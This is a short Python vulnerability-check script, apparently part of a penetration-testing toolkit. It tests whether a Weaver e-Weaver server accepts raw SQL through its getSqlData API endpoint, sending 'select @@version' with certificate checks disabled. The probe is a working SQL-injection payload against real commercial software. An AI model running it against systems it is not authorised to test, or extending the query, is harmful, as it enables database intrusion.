# sql_injection_scan.py

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout

def scan_sql_injection(url, proxies, headers, append_to_output):
    encodetext = url + "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"
    append_to_output(f"扫描目标: {url}", "blue")
    append_to_output("===================================================================", "green")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req1 = requests.get(encodetext, headers=headers, verify=False, timeout=20, proxies=proxies)

        if req1.status_code == 200 and 'api_status' in req1.text and 'data' in req1.text:
            append_to_output(f"[+] {url} 存在泛微e-Weaver SQL注入！！！！", "red")
        else:
            append_to_output(f"[-] {url} 不存在泛微e-Weaver SQL注入", "green")
    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
